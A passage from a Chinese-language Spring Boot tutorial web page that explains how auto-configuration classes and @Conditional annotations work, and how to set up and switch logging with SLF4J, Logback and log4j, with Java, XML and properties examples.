xxxAutoConfiguration类都是容器中的一个组件，都加入到容器中；用他们来做自动配置；</p><p>3）、每一个自动配置类进行自动配置功能；</p><p>4）、以<strong>HttpEncodingAutoConfiguration（Http编码自动配置）</strong>为例解释自动配置原理；</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span>   <span class="comment">//表示这是一个配置类，以前编写的配置文件一样，也可以给容器中添加组件</span></span><br><span class="line"><span class="meta">@EnableConfigurationProperties(HttpEncodingProperties.class)</span>  <span class="comment">//启动指定类的ConfigurationProperties功能；将配置文件中对应的值和HttpEncodingProperties绑定起来；并把HttpEncodingProperties加入到ioc容器中</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@ConditionalOnWebApplication</span> <span class="comment">//Spring底层@Conditional注解（Spring注解版），根据不同的条件，如果满足指定的条件，整个配置类里面的配置就会生效；    判断当前应用是否是web应用，如果是，当前配置类生效</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@ConditionalOnClass(CharacterEncodingFilter.class)</span>  <span class="comment">//判断当前项目有没有这个类CharacterEncodingFilter；SpringMVC中进行乱码解决的过滤器；</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@ConditionalOnProperty(prefix = "spring.http.encoding", value = "enabled", matchIfMissing = true)</span>  <span class="comment">//判断配置文件中是否存在某个配置  spring.http.encoding.enabled；如果不存在，判断也是成立的</span></span><br><span class="line"><span class="comment">//即使我们配置文件中不配置pring.http.encoding.enabled=true，也是默认生效的；</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HttpEncodingAutoConfiguration</span> {</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//他已经和SpringBoot的配置文件映射了</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> HttpEncodingProperties properties;</span><br><span class="line">  </span><br><span class="line">   <span class="comment">//只有一个有参构造器的情况下，参数的值就会从容器中拿</span></span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">HttpEncodingAutoConfiguration</span><span class="params">(HttpEncodingProperties properties)</span> {</span><br><span class="line"><span class="built_in">this</span>.properties = properties;</span><br><span class="line">}</span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Bean</span>   <span class="comment">//给容器中添加一个组件，这个组件的某些值需要从properties中获取</span></span><br><span class="line"><span class="meta">@ConditionalOnMissingBean(CharacterEncodingFilter.class)</span> <span class="comment">//判断容器没有这个组件？</span></span><br><span class="line"><span class="keyword">public</span> CharacterEncodingFilter <span class="title function_">characterEncodingFilter</span><span class="params">()</span> {</span><br><span class="line"><span class="type">CharacterEncodingFilter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OrderedCharacterEncodingFilter</span>();</span><br><span class="line">filter.setEncoding(<span class="built_in">this</span>.properties.getCharset().name());</span><br><span class="line">filter.setForceRequestEncoding(<span class="built_in">this</span>.properties.shouldForce(Type.REQUEST));</span><br><span class="line">filter.setForceResponseEncoding(<span class="built_in">this</span>.properties.shouldForce(Type.RESPONSE));</span><br><span class="line"><span class="keyword">return</span> filter;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>根据当前不同的条件判断，决定这个配置类是否生效？</p><p>一但这个配置类生效；这个配置类就会给容器中添加各种组件；这些组件的属性是从对应的properties类中获取的，这些类里面的每一个属性又是和配置文件绑定的；</p><p>5）、所有在配置文件中能配置的属性都是在xxxxProperties类中封装者‘；配置文件能配置什么就可以参照某个功能对应的这个属性类</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ConfigurationProperties(prefix = "spring.http.encoding")</span>  <span class="comment">//从配置文件中获取指定的值和bean的属性进行绑定</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HttpEncodingProperties</span> {</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Charset</span> <span class="variable">DEFAULT_CHARSET</span> <span class="operator">=</span> Charset.forName(<span class="string">"UTF-8"</span>);</span><br></pre></td></tr></tbody></table></figure><p><strong>精髓：</strong></p><p>​    <strong>1）、SpringBoot启动会加载大量的自动配置类</strong></p><p>​    <strong>2）、我们看我们需要的功能有没有SpringBoot默认写好的自动配置类；</strong></p><p>​    <strong>3）、我们再来看这个自动配置类中到底配置了哪些组件；（只要我们要用的组件有，我们就不需要再来配置了）</strong></p><p>​    <strong>4）、给容器中自动配置类添加组件的时候，会从properties类中获取某些属性。我们就可以在配置文件中指定这些属性的值；</strong></p><p>xxxxAutoConfigurartion：自动配置类；</p><p>给容器中添加组件</p><p>xxxxProperties:封装配置文件中相关属性；</p><h3 id="2、细节"><a href="#2、细节" class="headerlink" title="2、细节"></a>2、细节</h3><h4 id="1、-Conditional派生注解（Spring注解版原生的-Conditional作用）"><a href="#1、-Conditional派生注解（Spring注解版原生的-Conditional作用）" class="headerlink" title="1、@Conditional派生注解（Spring注解版原生的@Conditional作用）"></a>1、@Conditional派生注解（Spring注解版原生的@Conditional作用）</h4><p>作用：必须是@Conditional指定的条件成立，才给容器中添加组件，配置配里面的所有内容才生效；</p><table><thead><tr><th>@Conditional扩展注解</th><th>作用（判断是否满足当前指定条件）</th></tr></thead><tbody><tr><td>@ConditionalOnJava</td><td>系统的java版本是否符合要求</td></tr><tr><td>@ConditionalOnBean</td><td>容器中存在指定Bean；</td></tr><tr><td>@ConditionalOnMissingBean</td><td>容器中不存在指定Bean；</td></tr><tr><td>@ConditionalOnExpression</td><td>满足SpEL表达式指定</td></tr><tr><td>@ConditionalOnClass</td><td>系统中有指定的类</td></tr><tr><td>@ConditionalOnMissingClass</td><td>系统中没有指定的类</td></tr><tr><td>@ConditionalOnSingleCandidate</td><td>容器中只有一个指定的Bean，或者这个Bean是首选Bean</td></tr><tr><td>@ConditionalOnProperty</td><td>系统中指定的属性是否有指定的值</td></tr><tr><td>@ConditionalOnResource</td><td>类路径下是否存在指定资源文件</td></tr><tr><td>@ConditionalOnWebApplication</td><td>当前是web环境</td></tr><tr><td>@ConditionalOnNotWebApplication</td><td>当前不是web环境</td></tr><tr><td>@ConditionalOnJndi</td><td>JNDI存在指定项</td></tr></tbody></table><p><strong>自动配置类必须在一定的条件下才能生效；</strong></p><p>我们怎么知道哪些自动配置类生效；</p><p>**==我们可以通过启用  debug=true属性；来让控制台打印自动配置报告==**，这样我们就可以很方便的知道哪些自动配置类生效；</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">=========================</span><br><span class="line">AUTO-CONFIGURATION REPORT</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Positive matches:（自动配置类启用的）</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">   DispatcherServletAutoConfiguration matched:</span><br><span class="line">      - <span class="meta">@ConditionalOnClass</span> found required class <span class="string">'org.springframework.web.servlet.DispatcherServlet'</span>; <span class="meta">@ConditionalOnMissingClass</span> did not find unwanted <span class="title function_">class</span> <span class="params">(OnClassCondition)</span></span><br><span class="line">      - <span class="meta">@ConditionalOnWebApplication</span> (required) found <span class="title function_">StandardServletEnvironment</span> <span class="params">(OnWebApplicationCondition)</span></span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">Negative matches:（没有启动，没有匹配成功的自动配置类）</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">   ActiveMQAutoConfiguration:</span><br><span class="line">      Did not match:</span><br><span class="line">         - <span class="meta">@ConditionalOnClass</span> did not find required classes <span class="string">'javax.jms.ConnectionFactory'</span>, <span class="string">'org.apache.activemq.ActiveMQConnectionFactory'</span> (OnClassCondition)</span><br><span class="line"></span><br><span class="line">   AopAutoConfiguration:</span><br><span class="line">      Did not match:</span><br><span class="line">         - <span class="meta">@ConditionalOnClass</span> did not find required classes <span class="string">'org.aspectj.lang.annotation.Aspect'</span>, <span class="string">'org.aspectj.lang.reflect.Advice'</span> (OnClassCondition)</span><br><span class="line">        </span><br></pre></td></tr></tbody></table></figure><h1 id="三、日志"><a href="#三、日志" class="headerlink" title="三、日志"></a>三、日志</h1><h2 id="1、日志框架"><a href="#1、日志框架" class="headerlink" title="1、日志框架"></a>1、日志框架</h2><p> 小张；开发一个大型系统；</p><p>​        1、System.out.println(“”)；将关键数据打印在控制台；去掉？写在一个文件？</p><p>​        2、框架来记录系统的一些运行时信息；日志框架 ；  zhanglogging.jar；</p><p>​        3、高大上的几个功能？异步模式？自动归档？xxxx？  zhanglogging-good.jar？</p><p>​        4、将以前框架卸下来？换上新的框架，重新修改之前相关的API；zhanglogging-prefect.jar；</p><p>​        5、JDBC—数据库驱动；</p><p>​            写了一个统一的接口层；日志门面（日志的一个抽象层）；logging-abstract.jar；</p><p>​            给项目中导入具体的日志实现就行了；我们之前的日志框架都是实现的抽象层；</p><p><strong>市面上的日志框架；</strong></p><p>JUL、JCL、Jboss-logging、logback、log4j、log4j2、slf4j….</p><table><thead><tr><th>日志门面  （日志的抽象层）</th><th>日志实现</th></tr></thead><tbody><tr><td><del>JCL（Jakarta  Commons Logging）</del>    SLF4j（Simple  Logging Facade for Java）    <strong><del>jboss-logging</del></strong></td><td>Log4j  JUL（java.util.logging）  Log4j2  <strong>Logback</strong></td></tr></tbody></table><p>左边选一个门面（抽象层）、右边来选一个实现；</p><p>日志门面：  SLF4J；</p><p>日志实现：Logback；</p><p>SpringBoot：底层是Spring框架，Spring框架默认是用JCL；‘</p><p>​    <strong>==SpringBoot选用 SLF4j和logback；==</strong></p><h2 id="2、SLF4j使用"><a href="#2、SLF4j使用" class="headerlink" title="2、SLF4j使用"></a>2、SLF4j使用</h2><h3 id="1、如何在系统中使用SLF4j-https-www-slf4j-org"><a href="#1、如何在系统中使用SLF4j-https-www-slf4j-org" class="headerlink" title="1、如何在系统中使用SLF4j   https://www.slf4j.org"></a>1、如何在系统中使用SLF4j   <a href="https://www.slf4j.org/">https://www.slf4j.org</a></h3><p>以后开发的时候，日志记录方法的调用，不应该来直接调用日志的实现类，而是调用日志抽象层里面的方法；</p><p>给系统里面导入slf4j的jar和  logback的实现jar</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.slf4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.LoggerFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> {</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line">    <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LoggerFactory.getLogger(HelloWorld.class);</span><br><span class="line">    logger.info(<span class="string">"Hello World"</span>);</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>图示；</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/59173/concrete-bindings.png" alt="images/concrete-bindings.png"></p><p>每一个日志的实现框架都有自己的配置文件。使用slf4j以后，<strong>配置文件还是做成日志实现框架自己本身的配置文件；</strong></p><h3 id="2、遗留问题"><a href="#2、遗留问题" class="headerlink" title="2、遗留问题"></a>2、遗留问题</h3><p>a（slf4j+logback）: Spring（commons-logging）、Hibernate（jboss-logging）、MyBatis、xxxx</p><p>统一日志记录，即使是别的框架和我一起统一使用slf4j进行输出？</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/59173/legacy.png"></p><p><strong>如何让系统中所有的日志都统一到slf4j；</strong></p><p>==1、将系统中其他日志框架先排除出去；==</p><p>==2、用中间包来替换原有的日志框架；==</p><p>==3、我们导入slf4j其他的实现==</p><h2 id="3、SpringBoot日志关系"><a href="#3、SpringBoot日志关系" class="headerlink" title="3、SpringBoot日志关系"></a>3、SpringBoot日志关系</h2><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>SpringBoot使用它来做日志功能；</p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>底层依赖关系</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/59173/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180131220946.png"></p><p>总结：</p><p>​    1）、SpringBoot底层也是使用slf4j+logback的方式进行日志记录</p><p>​    2）、SpringBoot也把其他的日志都替换成了slf4j；</p><p>​    3）、中间替换包？</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings("rawtypes")</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">LogFactory</span> {</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="type">String</span> <span class="variable">UNSUPPORTED_OPERATION_IN_JCL_OVER_SLF4J</span> <span class="operator">=</span> <span class="string">"http://www.slf4j.org/codes.html#unsupported_operation_in_jcl_over_slf4j"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="type">LogFactory</span> <span class="variable">logFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SLF4JLogFactory</span>();</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/59173/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180131221411.png"></p><p>​    4）、如果我们要引入其他框架？一定要把这个框架的默认日志依赖移除掉？</p><p>​            Spring框架用的是commons-logging；</p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p><strong>==SpringBoot能自动适配所有的日志，而且底层使用slf4j+logback的方式记录日志，引入其他框架的时候，只需要把这个框架依赖的日志框架排除掉即可；==</strong></p><h2 id="4、日志使用；"><a href="#4、日志使用；" class="headerlink" title="4、日志使用；"></a>4、日志使用；</h2><h3 id="1、默认配置"><a href="#1、默认配置" class="headerlink" title="1、默认配置"></a>1、默认配置</h3><p>SpringBoot默认帮我们配置好了日志；</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//记录器</span></span><br><span class="line"><span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LoggerFactory.getLogger(getClass());</span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">contextLoads</span><span class="params">()</span> {</span><br><span class="line"><span class="comment">//System.out.println();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//日志的级别；</span></span><br><span class="line"><span class="comment">//由低到高   trace&lt;debug&lt;info&lt;warn&lt;error</span></span><br><span class="line"><span class="comment">//可以调整输出的日志级别；日志就只会在这个级别以以后的高级别生效</span></span><br><span class="line">logger.trace(<span class="string">"这是trace日志..."</span>);</span><br><span class="line">logger.debug(<span class="string">"这是debug日志..."</span>);</span><br><span class="line"><span class="comment">//SpringBoot默认给我们使用的是info级别的，没有指定级别的就用SpringBoot默认规定的级别；root级别</span></span><br><span class="line">logger.info(<span class="string">"这是info日志..."</span>);</span><br><span class="line">logger.warn(<span class="string">"这是warn日志..."</span>);</span><br><span class="line">logger.error(<span class="string">"这是error日志..."</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><pre><code>    日志输出格式：        %d表示日期时间，        %thread表示线程名，        %-5level：级别从左显示5个字符宽度        %logger{50} 表示logger名字最长50个字符，否则按照句点分割。         %msg：日志消息，        %n是换行符    --&gt;    %d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{50} - %msg%n</code></pre><p>SpringBoot修改日志的默认配置</p><figure class="highlight properties"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">logging.level.com.atguigu</span>=<span class="string">trace</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#logging.path=</span></span><br><span class="line"><span class="comment"># 不指定路径在当前项目下生成springboot.log日志</span></span><br><span class="line"><span class="comment"># 可以指定完整的路径；</span></span><br><span class="line"><span class="comment">#logging.file=G:/springboot.log</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># 在当前磁盘的根路径下创建spring文件夹和里面的log文件夹；使用&nbsp;spring.log 作为默认文件</span></span><br><span class="line"><span class="attr">logging.path</span>=<span class="string">/spring/log</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#  在控制台输出的日志的格式</span></span><br><span class="line"><span class="attr">logging.pattern.console</span>=<span class="string">%d{yyyy-MM-dd} [%thread] %-5level %logger{50} - %msg%n</span></span><br><span class="line"><span class="comment"># 指定文件中日志输出的格式</span></span><br><span class="line"><span class="attr">logging.pattern.file</span>=<span class="string">%d{yyyy-MM-dd} === [%thread] === %-5level === %logger{50} ==== %msg%n</span></span><br></pre></td></tr></tbody></table></figure><table><thead><tr><th>logging.file</th><th>logging.path</th><th>Example</th><th>Description</th></tr></thead><tbody><tr><td>(none)</td><td>(none)</td><td></td><td>只在控制台输出</td></tr><tr><td>指定文件名</td><td>(none)</td><td>my.log</td><td>输出日志到my.log文件</td></tr><tr><td>(none)</td><td>指定目录</td><td>/var/log</td><td>输出到指定目录的 spring.log 文件中</td></tr></tbody></table><h3 id="2、指定配置"><a href="#2、指定配置" class="headerlink" title="2、指定配置"></a>2、指定配置</h3><p>给类路径下放上每个日志框架自己的配置文件即可；SpringBoot就不使用他默认配置的了</p><table><thead><tr><th>Logging System</th><th>Customization</th></tr></thead><tbody><tr><td>Logback</td><td><code>logback-spring.xml</code>, <code>logback-spring.groovy</code>, <code>logback.xml</code> or <code>logback.groovy</code></td></tr><tr><td>Log4j2</td><td><code>log4j2-spring.xml</code> or <code>log4j2.xml</code></td></tr><tr><td>JDK (Java Util Logging)</td><td><code>logging.properties</code></td></tr></tbody></table><p>logback.xml：直接就被日志框架识别了；</p><p><strong>logback-spring.xml</strong>：日志框架就不直接加载日志的配置项，由SpringBoot解析日志配置，可以使用SpringBoot的高级Profile功能</p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">springProfile</span> <span class="attr">name</span>=<span class="string">"staging"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- configuration to be enabled when the "staging" profile is active --&gt;</span></span><br><span class="line">  可以指定某段配置只在某个环境下生效</span><br><span class="line"><span class="tag">&lt;/<span class="name">springProfile</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>如：</p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">"stdout"</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.ConsoleAppender"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        日志输出格式：</span></span><br><span class="line"><span class="comment">%d表示日期时间，</span></span><br><span class="line"><span class="comment">%thread表示线程名，</span></span><br><span class="line"><span class="comment">%-5level：级别从左显示5个字符宽度</span></span><br><span class="line"><span class="comment">%logger{50} 表示logger名字最长50个字符，否则按照句点分割。 </span></span><br><span class="line"><span class="comment">%msg：日志消息，</span></span><br><span class="line"><span class="comment">%n是换行符</span></span><br><span class="line"><span class="comment">        --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">layout</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.classic.PatternLayout"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">springProfile</span> <span class="attr">name</span>=<span class="string">"dev"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d{yyyy-MM-dd HH:mm:ss.SSS} ----&gt; [%thread] ---&gt; %-5level %logger{50} - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">springProfile</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">springProfile</span> <span class="attr">name</span>=<span class="string">"!dev"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d{yyyy-MM-dd HH:mm:ss.SSS} ==== [%thread] ==== %-5level %logger{50} - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">springProfile</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">layout</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>如果使用logback.xml作为日志配置文件，还要使用profile功能，会有以下错误</p><p> <code>no applicable action for [springProfile]</code></p><h2 id="5、切换日志框架"><a href="#5、切换日志框架" class="headerlink" title="5、切换日志框架"></a>5、切换日志框架</h2><p>可以按照slf4j的日志适配图，进行相关的切换；</p><p>slf4j+log4j的方式；</p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>logback-classic<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ch.qos.logback<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-over-slf4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-log4j12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>切换为log4j2</p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span 